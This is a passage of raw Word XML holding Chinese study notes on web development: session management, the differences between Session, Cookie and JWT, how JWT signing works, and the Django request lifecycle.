        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>都无济于事。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B843E43" w14:textId="0A5CC475"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lastRenderedPageBreak/>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="001C72C9">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>4 Session,Cookie,JWT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B55420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为什么要使用会话管理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>众所周知，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议是一个无状态的协议，也就是说每个请求都是一个独立的请求，请求与请求之间并无关系。但在实际的应用场景，这种方式并不能满足我们的需求。举个大家都喜欢用的例子，把商品加入购物车，单独考虑这个请求，服务端并不知道这个商品是谁的，应该加入谁的购物车？因此这个请求的上下文环境实际上应该包含用户的相关信息，在每次用户发出请求时把这一小部分额外信息，也做为请求的一部分，这样服务端就可以根据上下文中的信息，针对具体的用户进行操作。所以这几种技术的出现都是对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议的一个补充，使得我们可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>状态管理构建一个的面向用户的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WEB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>应用。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D27DB3"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Session </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>这里我想先谈谈</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因为这两个技术是做为开发最为常见的。那么</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的区别是什么？个人认为</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最核心区别在于额外信息由谁来维护。利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>来实现会话管理时，用户的相关信息或者其他我们想要保持在每个请求中的信息，都是放在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是由客户端来保存，每当客户端发出新请求时，就会稍带上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务端会根据其中的信息进行操作。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>当利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>来进行会话管理时，客户端实际上只存了一个由服务端发送的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session_id,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>而由这个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session_id,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>可以在服务端还原出所需要的所有状态信息，从这里可以看出这部分信息是由服务端来维护的。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>除此以外，</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都有一些自己的缺点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的安全性不好，攻击者可以通过获取本地</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>进行欺骗或者利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>攻击。使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>在多个域名下，会存在跨域问题。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> session </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>在一定的时间里，需要存放在服务端，因此当拥有大量用户时，也会大幅度降低服务端的性能，当有多台机器时，如何共享</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>也会是一个问题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>.(redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>集群</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>也就是说，用户第一个访问的时候是服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，而第二个请求被转发给了服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，那服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>如何得知其状态。实际上，</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是有联系的，比如我们可以把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session_id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>存放在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362D2B9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JWT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是如何工作的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>首先用户发出登录请求，服务端根据用户的登录请求进行匹配，如果匹配成功，将相关的信息放入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中，利用算法，加上服务端的密钥生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，这里需要注意的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>secret_key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>很重要，如果这个泄露的话，客户端就可以随机篡改发送的额外信息，它是信息完整性的保证。生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>后服务端将其返回给客户端，客户端可以在下次请求时，将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>一起交给服务端，一般是说我们可以将其放在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>首部中，这样也就可以避免跨域问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEE51D0" w14:textId="4CD3095B"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 xml:space="preserve">5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>请求生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC5927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一般是用户通过浏览器向我们的服务器发起一个请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>(request),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>这个请求会去访问视图函数，如果不涉及到数据调用，那么这个时候视图函数返回一个模板也就是一个网页给用户）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>视图函数调用模型毛模型去数据库查找数据，然后逐级返回，视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A50C80" w14:textId="77777777" w:rsidR="00D8288D"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1.wsgi ,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>请求封装后交给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">Django) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4890F3D0" w14:textId="046F232C"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中间件，对请求进行校验或在请求对象中添加其他相关数据，例如：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">csrf,request.session </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE653D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路由匹配</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>根据浏览器发送的不同</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>去匹配不同的视图函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2A704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视图函数，在视图函数中进行业务逻辑的处理，可能涉及到：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">templates </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2287F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5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中间件，对响应的数据进行处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6.wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，将响应的内容发送给浏览器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C8158F" w14:textId="6265EC36"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 xml:space="preserve">6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>restframework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>完成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
